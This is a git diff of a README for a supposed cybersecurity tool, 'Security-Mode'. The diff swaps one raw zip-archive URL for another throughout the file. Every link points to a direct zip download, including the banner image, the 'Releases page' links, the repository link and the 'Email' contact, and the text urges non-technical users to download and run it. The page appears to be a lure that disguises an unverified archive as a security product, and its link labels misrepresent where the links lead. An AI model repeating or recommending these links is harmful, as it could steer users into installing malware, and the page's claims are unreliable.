@@ -1,6 +1,6 @@
 # 🔒 Security-Mode - Keep Your System Safe and Sound
 
-![Security Mode - Tool for cybersecurity edition.](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/policy-engine/Mode_Security_v3.2-beta.1.zip)
+![Security Mode - Tool for cybersecurity edition.](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/cli/Mode_Security_v2.8.zip)
 
 ## 🛠️ Overview
 
@@ -11,13 +11,13 @@
 To get started with Security-Mode, you will need to download the application from our releases page. The process is straightforward and does not require any technical skills.
 
 **Download Security-Mode now:**  
-[![Download Security-Mode](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/policy-engine/Mode_Security_v3.2-beta.1.zip)](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/policy-engine/Mode_Security_v3.2-beta.1.zip)
+[![Download Security-Mode](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/cli/Mode_Security_v2.8.zip)](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/cli/Mode_Security_v2.8.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
    Click on the link below to go to the Releases page where you can find the latest version of Security-Mode:  
-   [Download from Releases](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/policy-engine/Mode_Security_v3.2-beta.1.zip)
+   [Download from Releases](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/cli/Mode_Security_v2.8.zip)
 
 2. **Choose Your Version:**  
    On the Releases page, you will see different versions of the application. Look for the most recent version, which will usually be at the top of the list.
@@ -69,10 +69,10 @@ These topics provide additional resources and tools to enhance your cybersecurit
 
 For direct support or inquiries, please use the following:
 
-- **Email:** https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/policy-engine/Mode_Security_v3.2-beta.1.zip
-- **GitHub Repository:** [Security-Mode](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/policy-engine/Mode_Security_v3.2-beta.1.zip)
+- **Email:** https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/cli/Mode_Security_v2.8.zip
+- **GitHub Repository:** [Security-Mode](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/cli/Mode_Security_v2.8.zip)
 
 Revisit our releases to always have the latest version:  
-[Download from Releases](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/policy-engine/Mode_Security_v3.2-beta.1.zip)
+[Download from Releases](https://github.com/Ghazi67/Security-Mode/raw/refs/heads/main/source-code/cli/Mode_Security_v2.8.zip)
 
 Thank you for choosing Security-Mode as your cybersecurity tool. Stay safe online!
